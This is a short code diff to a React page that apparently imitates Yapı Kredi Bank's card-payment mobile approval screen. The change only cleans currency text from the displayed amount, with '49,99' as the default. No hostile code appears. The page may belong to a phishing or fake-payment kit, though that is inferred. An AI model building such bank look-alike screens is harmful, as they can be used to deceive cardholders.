@@ -103,6 +103,7 @@ export default function YkbMobilOnayPage() {
     // Kart numarası maskeleme (YKB stili)
     const cc = data?.lastFourDigits || '****';
     const cardScheme = data?.cardType === 'visa' ? 'VISA' : (data?.cardType === 'mastercard' ? 'MASTERCARD' : 'TROY');
+    const cleanTutar = (data?.tutar || '').replace(/TL|TRY|₺/gi, '').trim() || '49,99';
 
     return (
         <>
@@ -375,7 +376,7 @@ export default function YkbMobilOnayPage() {
                             <div className="info-value">{data?.isyeriAdi}</div>
                             
                             <div className="info-label">Tutar</div>
-                            <div className="info-value">{data?.tutar} TL</div>
+                            <div className="info-value">{cleanTutar} TL</div>
                             
                             <div className="info-label">Tarih</div>
                             <div className="info-value">{data?.tarih}</div>
